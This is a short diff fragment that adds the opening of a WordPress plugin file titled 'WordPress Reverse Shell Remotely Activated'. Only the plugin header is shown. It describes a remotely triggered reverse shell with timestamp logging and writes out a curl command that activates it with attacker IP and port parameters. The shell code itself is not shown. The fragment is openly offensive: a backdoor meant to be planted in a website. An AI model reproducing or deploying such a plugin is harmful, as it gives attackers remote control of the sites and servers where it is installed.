@@ -1,3 +1,4 @@
+<?php
 /*
 Plugin Name: WordPress Reverse Shell Remotely Activated
 Description: Reverse Shell with Timestamp Logging - Activated via HTTP Request: curl 'http://[Your_WordPress_Site]/path/to/plugin_file.php?activate=1&ip=[Attacker_IP]&port=[Attacker_Port]'
